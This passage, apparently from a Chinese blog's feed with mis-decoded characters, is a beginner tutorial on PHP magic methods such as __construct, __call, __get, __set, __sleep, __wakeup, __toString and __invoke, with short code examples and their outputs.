human();</span><br><span class="line">$people-&gt;eat(&#x27;rice&#x27;);</span><br><span class="line"></span><br><span class="line">$monkey=new animal();</span><br><span class="line">$monkey-&gt;eat(&#x27;banana&#x27;);</span><br></pre></td></tr></table></figure>

<p>è¾“å‡º</p>
<p>æˆ‘åƒï¼šriceæˆ‘åƒ:banana</p>
]]></content>
  </entry>
  <entry>
    <title>é­”æœ¯æ–¹æ³•</title>
    <url>/2022/11/11/%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>PHPçš„åŸºæœ¬é­”æœ¯æ–¹æ³•</p>
<span id="more"></span>

<p>PHPä¸­æŠŠä»¥ä¸¤ä¸ªä¸‹åˆ’çº¿__å¼€å¤´çš„æ–¹æ³•ç§°ä¸ºé­”æœ¯æ–¹æ³•</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">é™¤äº†__construct()ï¼Œ__destruct()å’Œ__clone()ä¹‹å¤–çš„æ‰€æœ‰é­”æœ¯æ–¹æ³•éƒ½ å¿…é¡»å£°æ˜ä¸º public</span><br></pre></td></tr></table></figure>

<h4 id="1-construct-ï¼Œç±»çš„æ„é€ å‡½æ•°"><a href="#1-construct-ï¼Œç±»çš„æ„é€ å‡½æ•°" class="headerlink" title="1.__construct()ï¼Œç±»çš„æ„é€ å‡½æ•°"></a>1.__construct()ï¼Œç±»çš„æ„é€ å‡½æ•°</h4><p>é€šå¸¸æ„é€ æ–¹æ³•è¢«ç”¨æ¥æ‰§è¡Œä¸€äº›æœ‰ç”¨çš„åˆå§‹åŒ–ä»»åŠ¡ï¼Œå¦‚å¯¹æˆå‘˜å±æ€§åœ¨åˆ›å»ºå¯¹è±¡æ—¶èµ‹äºˆåˆå§‹å€¼ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class person&#123;</span><br><span class="line">//å…ˆå£°æ˜å±æ€§</span><br><span class="line">    public $name;</span><br><span class="line">    public $age;</span><br><span class="line">    public $sex;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public function __construct($name=&quot;&quot;,$sex=&quot;ç”·&quot;,$age=&quot;18&quot;)//è¿™é‡Œæ˜¯è§„å®šçš„åˆå§‹å€¼</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name=$name;</span><br><span class="line">        $this-&gt;sex=$sex;</span><br><span class="line">        $this-&gt;age=$age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function say()&#123;</span><br><span class="line">        echo &quot;æˆ‘å«:&quot;. $this-&gt;name .&quot;ï¼Œæ€§åˆ«:&quot;.$this-&gt;sex.&quot;ï¼Œå¹´é¾„:&quot;.$this-&gt;age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$person1=new person(&quot;å°æ˜&quot;,&quot;å¥³&quot;,&quot;23&quot;);//è¿™é‡Œå¯ä»¥æ”¹å˜åˆå§‹å€¼ï¼Œå¦‚æœä»€ä¹ˆéƒ½æ²¡æœ‰å°±ä¼šè¿”å›åˆå§‹å€¼</span><br><span class="line">echo $person1-&gt;say();//è°ƒç”¨sayæ–¹æ³•</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·å¯ä»¥è¾“å‡º  æˆ‘å«:å°æ˜ï¼Œæ€§åˆ«:å¥³ï¼Œå¹´é¾„:23</p>
<h4 id="2-destruct-ç±»çš„ææ„å‡½æ•°"><a href="#2-destruct-ç±»çš„ææ„å‡½æ•°" class="headerlink" title="2.__destruct(), ç±»çš„ææ„å‡½æ•°"></a>2.__destruct(), ç±»çš„ææ„å‡½æ•°</h4><p>ææ„æ–¹æ³•å…è®¸åœ¨é”€æ¯ä¸€ä¸ªç±»ä¹‹å‰æ‰§è¡Œçš„ä¸€äº›æ“ä½œæˆ–å®Œæˆä¸€äº›åŠŸèƒ½</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class person&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    public $age;</span><br><span class="line">    public $sex;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public function __construct($name=&quot;&quot;,$sex=&quot;ç”·&quot;,$age=&quot;18&quot;)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name=$name;</span><br><span class="line">        $this-&gt;sex=$sex;</span><br><span class="line">        $this-&gt;age=$age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function say()&#123;</span><br><span class="line">        echo &quot;æˆ‘å«:&quot;. $this-&gt;name .&quot;ï¼Œæ€§åˆ«:&quot;.$this-&gt;sex.&quot;ï¼Œå¹´é¾„:&quot;.$this-&gt;age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        echo &quot;ä½ å¥½&quot;.$this-&gt;name;   //å½“unsetä½¿ç”¨æ—¶å°±ä¼šè¾“å‡º</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$person1=new person(&quot;1&quot;);</span><br><span class="line">unset($person1);//æ‘§æ¯ä¸Šé¢çš„å¯¹è±¡</span><br></pre></td></tr></table></figure>

<p>è¾“å‡ºä¸ºä½ å¥½1</p>
<h4 id="3-call-åœ¨å¯¹è±¡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶è°ƒç”¨"><a href="#3-call-åœ¨å¯¹è±¡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶è°ƒç”¨" class="headerlink" title="3.__call(), åœ¨å¯¹è±¡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶è°ƒç”¨"></a>3.__call(), åœ¨å¯¹è±¡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶è°ƒç”¨</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ ¼å¼</span><br><span class="line">function __call($function,$arguments)&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ä¼šè‡ªåŠ¨æ¥æ”¶ä¸å­˜åœ¨çš„æ–¹æ³•åï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯ä»¥æ•°ç»„çš„æ–¹å¼æ¥æ”¶ä¸å­˜åœ¨æ–¹æ³•çš„å¤šä¸ªå‚æ•°ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class person&#123;</span><br><span class="line">    function say()&#123;</span><br><span class="line">        echo &quot;hello&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    function __call($h,$j)&#123;    //å¦‚æœè°ƒç”¨çš„æ–¹æ³•ä¸å­˜åœ¨å°±ä¼šè¾“å‡ºè¿™ä¸ªæ–¹æ³•å†…çš„ä¸œè¥¿</span><br><span class="line">        echo &quot;ä½ è°ƒç”¨çš„å‡½æ•°æ˜¯&quot;.$h.&quot;(å‚æ•°ï¼š&quot;;</span><br><span class="line">        print_r($j);</span><br><span class="line">        echo &quot;)ä¸å­˜åœ¨!&lt;br/&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$person1=new person();</span><br><span class="line">$person1-&gt;run(&#x27;tea&#x27;);//runæ–¹æ³•ä¸å­˜åœ¨</span><br><span class="line">$person1-&gt;eat(&#x27;å°æ˜&#x27;);//eatæ–¹æ³•ä¸å­˜åœ¨</span><br><span class="line">$person1-&gt;say();</span><br></pre></td></tr></table></figure>

<p>è¾“å‡ºä»¥ä¸‹</p>
<p>ä½ è°ƒç”¨çš„å‡½æ•°æ˜¯run(å‚æ•°ï¼šArray ( [0] &#x3D;&gt; tea ) )ä¸å­˜åœ¨!<br>ä½ è°ƒç”¨çš„å‡½æ•°æ˜¯eat(å‚æ•°ï¼šArray ( [0] &#x3D;&gt; å°æ˜ ) )ä¸å­˜åœ¨!<br>hello</p>
<h4 id="4-callStatic-ï¼Œç”¨é™æ€æ–¹å¼ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶è°ƒç”¨"><a href="#4-callStatic-ï¼Œç”¨é™æ€æ–¹å¼ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶è°ƒç”¨" class="headerlink" title="4.__callStatic()ï¼Œç”¨é™æ€æ–¹å¼ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶è°ƒç”¨"></a>4.__callStatic()ï¼Œç”¨é™æ€æ–¹å¼ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶è°ƒç”¨</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class person&#123;</span><br><span class="line">    function say()&#123;</span><br><span class="line">        echo &quot;hello&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public static function __callStatic($h,$j)&#123;  //å½“è°ƒç”¨çš„æ–¹æ³•ä¸å­˜åœ¨æ—¶å°±ä¼šè‡ªåŠ¨ä½¿ç”¨è¿™ä¸ªæ–¹æ³•</span><br><span class="line">        echo &quot;ä½ è°ƒç”¨çš„å‡½æ•°æ˜¯&quot;.$h.&quot;(å‚æ•°ï¼š&quot;;</span><br><span class="line">        print_r($j);</span><br><span class="line">        echo &quot;)ä¸å­˜åœ¨!&lt;br/&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$person1=new person();</span><br><span class="line">$person1::run(&#x27;tea&#x27;);//ä½¿ç”¨é™æ€æ–¹æ³•ï¼Œä½†runæ–¹æ³•ä¸å­˜åœ¨</span><br><span class="line">$person1::eat(&#x27;å°æ˜&#x27;);//ä½¿ç”¨é™æ€æ–¹æ³•ï¼Œä½†eatæ–¹æ³•ä¸å­˜åœ¨</span><br><span class="line">$person1-&gt;say();</span><br></pre></td></tr></table></figure>

<p>è¾“å‡º</p>
<p>ä½ è°ƒç”¨çš„å‡½æ•°æ˜¯run(å‚æ•°ï¼šArray ( [0] &#x3D;&gt; tea ) )ä¸å­˜åœ¨!<br>ä½ è°ƒç”¨çš„å‡½æ•°æ˜¯eat(å‚æ•°ï¼šArray ( [0] &#x3D;&gt; å°æ˜ ) )ä¸å­˜åœ¨!<br>hello</p>
<h4 id="5-get-ï¼Œè·å¾—ä¸€ä¸ªç±»çš„æˆå‘˜å˜é‡æ—¶è°ƒç”¨"><a href="#5-get-ï¼Œè·å¾—ä¸€ä¸ªç±»çš„æˆå‘˜å˜é‡æ—¶è°ƒç”¨" class="headerlink" title="5.__get()ï¼Œè·å¾—ä¸€ä¸ªç±»çš„æˆå‘˜å˜é‡æ—¶è°ƒç”¨"></a>5.__get()ï¼Œè·å¾—ä¸€ä¸ªç±»çš„æˆå‘˜å˜é‡æ—¶è°ƒç”¨</h4><p>ç±»çš„æˆå‘˜å±æ€§è¢«è®¾å®šä¸º private åï¼Œå¦‚æœæˆ‘ä»¬è¯•å›¾åœ¨å¤–é¢è°ƒç”¨å®ƒåˆ™ä¼šå‡ºç°â€œä¸èƒ½è®¿é—®æŸä¸ªç§æœ‰å±æ€§â€çš„é”™è¯¯ï¼Œå¯ä»¥ä½¿ç”¨__getè§£å†³</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class user&#123;</span><br><span class="line">    private $name;</span><br><span class="line">    private $age;</span><br><span class="line"></span><br><span class="line">    function __construct($name=&quot;&quot;,$age=&quot;&quot;)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name=$name;</span><br><span class="line">        $this-&gt;age=$age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __get($h)&#123;</span><br><span class="line">        if($this-&gt;age &gt;2)&#123;</span><br><span class="line">            echo &#x27;234&#x27;;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &#x27;re&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$person=new user(2,1);</span><br><span class="line">echo $person-&gt;age;//è°ƒç”¨ç§æœ‰çš„å±æ€§ï¼Œä¼šè‡ªåŠ¨ä½¿ç”¨__getæ–¹æ³•</span><br></pre></td></tr></table></figure>

<p>è¾“å‡ºre</p>
<h4 id="6-set-ï¼Œè®¾ç½®ä¸€ä¸ªç±»çš„æˆå‘˜å˜é‡æ—¶è°ƒç”¨"><a href="#6-set-ï¼Œè®¾ç½®ä¸€ä¸ªç±»çš„æˆå‘˜å˜é‡æ—¶è°ƒç”¨" class="headerlink" title="6.__set()ï¼Œè®¾ç½®ä¸€ä¸ªç±»çš„æˆå‘˜å˜é‡æ—¶è°ƒç”¨"></a>6.__set()ï¼Œè®¾ç½®ä¸€ä¸ªç±»çš„æˆå‘˜å˜é‡æ—¶è°ƒç”¨</h4><p>å½“è®¾ç½®ä¸å­˜åœ¨çš„å±æ€§æ—¶ï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨è§¦å‘å¯¹è±¡æ‰€åœ¨ç±»çš„å®šä¹‰å¥½çš„__setæ–¹æ³•</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class user&#123;</span><br><span class="line">    private $name;</span><br><span class="line">    private $age;</span><br><span class="line"></span><br><span class="line">    function __construct($name=&quot;&quot;,$age=&quot;&quot;)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name = $name;</span><br><span class="line">        $this-&gt;age = $age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __set($h,$v)&#123;   //å¦‚æœè°ƒç”¨çš„å±æ€§ä¸å­˜åœ¨æˆ–è€…æ— æ³•ä½¿ç”¨ï¼Œå°±ä¼šè‡ªåŠ¨è¾“å‡º__setæ–¹æ³•</span><br><span class="line">       echo $this-&gt;$h=$v; //$håœ¨è¿™é‡Œç›¸å½“äºnameå±æ€§ï¼Œ$vç›¸å½“äº&quot;å°çº¢&quot;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function say()&#123;</span><br><span class="line">        echo $this-&gt;name.$this-&gt;age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$person=new user(&quot;å°æ˜&quot;,25);</span><br><span class="line">$person-&gt;name=&quot;å°çº¢&quot;;//ä½¿ç”¨ç§æœ‰çš„å±æ€§ï¼Œæ²¡æœ‰__setä¸€èˆ¬ä¼šæŠ¥é”™</span><br></pre></td></tr></table></figure>

<p>è¾“å‡ºå°çº¢</p>
<h4 id="7-isset-ï¼Œå½“å¯¹ä¸å¯è®¿é—®å±æ€§è°ƒç”¨isset-æˆ–empty-æ—¶è°ƒç”¨"><a href="#7-isset-ï¼Œå½“å¯¹ä¸å¯è®¿é—®å±æ€§è°ƒç”¨isset-æˆ–empty-æ—¶è°ƒç”¨" class="headerlink" title="7.__isset()ï¼Œå½“å¯¹ä¸å¯è®¿é—®å±æ€§è°ƒç”¨isset()æˆ–empty()æ—¶è°ƒç”¨"></a>7.__isset()ï¼Œå½“å¯¹ä¸å¯è®¿é—®å±æ€§è°ƒç”¨isset()æˆ–empty()æ—¶è°ƒç”¨</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class user&#123;</span><br><span class="line">    public $sex;</span><br><span class="line">    private $name;</span><br><span class="line">    private $age;</span><br><span class="line"></span><br><span class="line">    public function __construct($name=&quot;&quot;,$age=25,$sex=&#x27;ç”·&#x27;)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name=$name;</span><br><span class="line">        $this-&gt;age=$age;</span><br><span class="line">        $this-&gt;sex=$sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __isset($j)  //å½“è°ƒç”¨ä¸€ä¸ªä¸å­˜åœ¨æˆ–è€…æ— æ³•è°ƒç”¨çš„å±æ€§æ—¶ï¼Œ__issetæ–¹æ³•å°±ä¼šè‡ªåŠ¨è°ƒç”¨</span><br><span class="line">    &#123;</span><br><span class="line">        echo &#x27;è‡ªåŠ¨è°ƒç”¨&#x27;;</span><br><span class="line">        echo isset($this-&gt;$j);//è¿™é‡Œæ¥æ‰§è¡Œissetçš„åŠ¨ä½œï¼Œè¿”å›å€¼ä¸º1è¯´æ˜å­˜åœ¨ï¼Œä¸è¿”å›1è¯´æ˜ä¸å­˜åœ¨</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$h=new user();</span><br><span class="line">echo isset($h-&gt;name);//nameå±æ€§ä¸ºç§æœ‰ï¼Œæ²¡æœ‰__issetå°±ä¼šæŠ¥é”™</span><br><span class="line">//isset() å‡½æ•°ç”¨äºæ£€æµ‹å˜é‡æ˜¯å¦å·²è®¾ç½®å¹¶ä¸”é NULL</span><br></pre></td></tr></table></figure>

<p>è¾“å‡ºè‡ªåŠ¨è°ƒç”¨1</p>
<p>__isset()çš„()ä¸­å¿…é¡»è§„å®šä¸€ä¸ªå‚æ•°ï¼Œå¦ä¾§æ— æ³•ä½¿ç”¨</p>
<h4 id="8-unset-ï¼Œå½“å¯¹ä¸å¯è®¿é—®å±æ€§è°ƒç”¨unset-æ—¶è¢«è°ƒç”¨ã€‚"><a href="#8-unset-ï¼Œå½“å¯¹ä¸å¯è®¿é—®å±æ€§è°ƒç”¨unset-æ—¶è¢«è°ƒç”¨ã€‚" class="headerlink" title="8.__unset()ï¼Œå½“å¯¹ä¸å¯è®¿é—®å±æ€§è°ƒç”¨unset()æ—¶è¢«è°ƒç”¨ã€‚"></a>8.__unset()ï¼Œå½“å¯¹ä¸å¯è®¿é—®å±æ€§è°ƒç”¨unset()æ—¶è¢«è°ƒç”¨ã€‚</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class user&#123;</span><br><span class="line">    public $sex;</span><br><span class="line">    private $name;</span><br><span class="line">    private $age;</span><br><span class="line"></span><br><span class="line">    public function __construct($name=&quot;&quot;,$age=25,$sex=&#x27;ç”·&#x27;)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name=$name;</span><br><span class="line">        $this-&gt;age=$age;</span><br><span class="line">        $this-&gt;sex=$sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __unset($j)  //å½“ä¸€ä¸ªå¯¹è±¡è°ƒç”¨ä¸€ä¸ªæ— æ³•è°ƒç”¨çš„å±æ€§æ—¶ï¼Œ__unsetæ–¹æ³•ä¼šè‡ªåŠ¨è¢«è°ƒç”¨</span><br><span class="line">    &#123;</span><br><span class="line">        echo &#x27;è‡ªåŠ¨è°ƒç”¨&#x27;;</span><br><span class="line">        echo isset($this-&gt;$j);//è¿™é‡Œæ‰§è¡Œåˆ é™¤åŠ¨ä½œï¼Œæ‰§è¡Œåè¿”å›å€¼ä¸º1</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$h=new user();</span><br><span class="line">unset($h-&gt;sex);//sexä¸ºå…¬æœ‰å¯ä»¥ç›´æ¥åˆ é™¤</span><br><span class="line">unset($h-&gt;name);//nameä¸ºç§æœ‰æ— æ³•ï¼Œæ²¡æœ‰__unsetå°±ä¼šæŠ¥é”™</span><br></pre></td></tr></table></figure>

<p>è¾“å‡ºè‡ªåŠ¨è°ƒç”¨1</p>
<h4 id="9-sleep-ï¼Œæ‰§è¡Œserialize-æ—¶ï¼Œå…ˆä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°"><a href="#9-sleep-ï¼Œæ‰§è¡Œserialize-æ—¶ï¼Œå…ˆä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°" class="headerlink" title="9.__sleep()ï¼Œæ‰§è¡Œserialize()æ—¶ï¼Œå…ˆä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°"></a>9.__sleep()ï¼Œæ‰§è¡Œserialize()æ—¶ï¼Œå…ˆä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°</h4><p>serialize() å‡½æ•°ä¼šæ£€æŸ¥ç±»ä¸­æ˜¯å¦å­˜åœ¨ä¸€ä¸ªé­”æœ¯æ–¹æ³• __sleep()ã€‚å¦‚æœå­˜åœ¨ï¼Œåˆ™è¯¥æ–¹æ³•ä¼šä¼˜å…ˆè¢«è°ƒç”¨ï¼Œç„¶åæ‰æ‰§è¡Œåºåˆ—åŒ–æ“ä½œã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class user&#123;</span><br><span class="line">    public $sex;</span><br><span class="line">    public $name;</span><br><span class="line">    public $age;</span><br><span class="line"></span><br><span class="line">    public function __construct($name=&quot;&quot;,$age=25,$sex=&#x27;ç”·&#x27;)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name=$name;</span><br><span class="line">        $this-&gt;age=$age;</span><br><span class="line">        $this-&gt;sex=$sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __sleep()&#123;</span><br><span class="line">        echo &#x27;è¿”å›&#x27;;</span><br><span class="line">        return array(&#x27;name&#x27;,&#x27;age&#x27;,&#x27;sex&#x27;);//å°†nameï¼Œageï¼Œsexçš„å€¼éƒ½åºåˆ—åŒ–</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$h=new user(&#x27;å°æ˜&#x27;);</span><br><span class="line">echo serialize($h);//è¯¥æ“ä½œä¸ä¼šæ‰§è¡Œï¼Œè€Œæ˜¯æ‰§è¡Œ__sleepæ–¹æ³•</span><br></pre></td></tr></table></figure>

<p>è¾“å‡º</p>
<p>è¿”å›O:4:â€userâ€:3:{s:4:â€nameâ€;s:6:â€å°æ˜â€;s:3:â€ageâ€;i:25;s:3:â€sexâ€;s:3:â€ç”·â€;}</p>
<h4 id="10-wakeup-ï¼Œæ‰§è¡Œunserialize-æ—¶ï¼Œå…ˆä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°"><a href="#10-wakeup-ï¼Œæ‰§è¡Œunserialize-æ—¶ï¼Œå…ˆä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°" class="headerlink" title="10.__wakeup()ï¼Œæ‰§è¡Œunserialize()æ—¶ï¼Œå…ˆä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°"></a>10.__wakeup()ï¼Œæ‰§è¡Œunserialize()æ—¶ï¼Œå…ˆä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°</h4><p>__wakeup() ç»å¸¸ç”¨åœ¨ååºåˆ—åŒ–æ“ä½œä¸­ï¼Œä¾‹å¦‚é‡æ–°å»ºç«‹æ•°æ®åº“è¿æ¥ï¼Œæˆ–æ‰§è¡Œå…¶å®ƒåˆå§‹åŒ–æ“ä½œã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class user&#123;</span><br><span class="line">    public $sex;</span><br><span class="line">    public $name;</span><br><span class="line">    public $age;</span><br><span class="line"></span><br><span class="line">    public function __construct($name=&quot;&quot;,$age=25,$sex=&#x27;ç”·&#x27;)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name=$name;</span><br><span class="line">        $this-&gt;age=$age;</span><br><span class="line">        $this-&gt;sex=$sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __sleep()&#123;   //è‡ªåŠ¨è°ƒç”¨åå†eè¿›è¡Œåºåˆ—åŒ–</span><br><span class="line">        echo &#x27;è¿”å›&#x27;;</span><br><span class="line">        return array(&#x27;name&#x27;,&#x27;age&#x27;,&#x27;sex&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()   //è‡ªåŠ¨è°ƒç”¨åè¿›è¡Œååºåˆ—åŒ–</span><br><span class="line">    &#123;</span><br><span class="line">        echo&quot;è°ƒç”¨__wakeup&quot;;</span><br><span class="line">        $this-&gt;age=1;//è¿™é‡Œå¯ä»¥æ”¹å˜å±æ€§çš„å€¼</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$h=new user(&#x27;å°æ˜&#x27;);</span><br><span class="line">var_dump(serialize($h));//å…ˆå°†$håºåˆ—åŒ–</span><br><span class="line">var_dump(unserialize(serialize($h)));//å°†åºåˆ—åŒ–çš„$hååºåˆ—åŒ–</span><br></pre></td></tr></table></figure>

<p>è¾“å‡º</p>
<p>è¿”å›string(74) â€œO:4:â€userâ€:3:{s:4:â€nameâ€;s:6:â€å°æ˜â€;s:3:â€ageâ€;i:25;s:3:â€sexâ€;s:3:â€ç”·â€;}â€ è¿”å›è°ƒç”¨__wakeupobject(user)#2 (3) { [â€œsexâ€]&#x3D;&gt; string(3) â€œç”·â€ [â€œnameâ€]&#x3D;&gt; string(6) â€œå°æ˜â€ [â€œageâ€]&#x3D;&gt; int(1) }</p>
<h4 id="11-toString-ï¼Œå¯¹è±¡è¢«å½“æˆå­—ç¬¦ä¸²æ—¶çš„å›åº”æ–¹æ³•"><a href="#11-toString-ï¼Œå¯¹è±¡è¢«å½“æˆå­—ç¬¦ä¸²æ—¶çš„å›åº”æ–¹æ³•" class="headerlink" title="11.__toString()ï¼Œå¯¹è±¡è¢«å½“æˆå­—ç¬¦ä¸²æ—¶çš„å›åº”æ–¹æ³•"></a>11.__toString()ï¼Œå¯¹è±¡è¢«å½“æˆå­—ç¬¦ä¸²æ—¶çš„å›åº”æ–¹æ³•</h4><p>ç”¨äºä¸€ä¸ªå¯¹è±¡è¢«å½“æˆå­—ç¬¦ä¸²æ—¶åº”æ€æ ·å›åº”ã€‚ä¾‹å¦‚ <code>echo $obj;</code> åº”è¯¥æ˜¾ç¤ºäº›ä»€ä¹ˆã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class user&#123;</span><br><span class="line">    public $sex;</span><br><span class="line">    public $name;</span><br><span class="line">    public $age;</span><br><span class="line"></span><br><span class="line">    public function __construct($name=&quot;&quot;,$age=25,$sex=&#x27;ç”·&#x27;)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name=$name;</span><br><span class="line">        $this-&gt;age=$age;</span><br><span class="line">        $this-&gt;sex=$sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public  function __tostring()&#123;  //åœ¨å¯¹è±¡è¢«å½“ä½œå­—ç¬¦ä¸²è¾“å‡ºæ—¶ä¼šè‡ªåŠ¨è°ƒç”¨__tostringæ–¹æ³•</span><br><span class="line">        return &#x27;go&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$h=new user();</span><br><span class="line">echo $h;//è¿™æ ·ä¼šæŠ¥é”™ï¼Œæ­£ç¡®çš„ä¸€èˆ¬æ˜¯$h-&gt;å±æ€§æˆ–è€…æ–¹æ³•</span><br></pre></td></tr></table></figure>

<p>è¾“å‡ºgo</p>
<h4 id="12-invoke-ï¼Œä½¿ç”¨è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶çš„å›åº”æ–¹æ³•"><a href="#12-invoke-ï¼Œä½¿ç”¨è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶çš„å›åº”æ–¹æ³•" class="headerlink" title="12.__invoke()ï¼Œä½¿ç”¨è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶çš„å›åº”æ–¹æ³•"></a>12.__invoke()ï¼Œä½¿ç”¨è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶çš„å›åº”æ–¹æ³•</h4><p>å½“å°è¯•ä»¥è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œ__invoke() æ–¹æ³•ä¼šè¢«è‡ªåŠ¨è°ƒç”¨</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class user&#123;</span><br><span class="line">    public $sex;</span><br><span class="line">    public $name;</span><br><span class="line">    public $age;</span><br><span class="line"></span><br><span class="line">    public function __construct($name=&quot;&quot;,$age=25,$sex=&#x27;ç”·&#x27;)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name=$name;</span><br><span class="line">        $this-&gt;age=$age;</span><br><span class="line">        $this-&gt;sex=$sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __invoke()&#123;  //å½“æŠŠå¯¹è±¡å½“ä½œå‡½æ•°ä½¿ç”¨æ—¶ï¼Œå°±ä¼šè‡ªåŠ¨è°ƒç”¨__invokeï¼Œå¯ä»¥é˜²æ­¢æŠ¥é”™</span><br><span class="line">        echo &#x27;123&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$h=new user();</span><br><span class="line">$h();//è¿™æ ·å¯ä»¥è°ƒç”¨å‡½æ•°ï¼Œä½†æ— æ³•è°ƒç”¨ä¸€ä¸ªå¯¹è±¡ï¼Œæ²¡æœ‰__invokeå°±ä¼šæŠ¥é”™</span><br></pre></td></tr></table></figure>

<p>è¾“å‡º123</p>
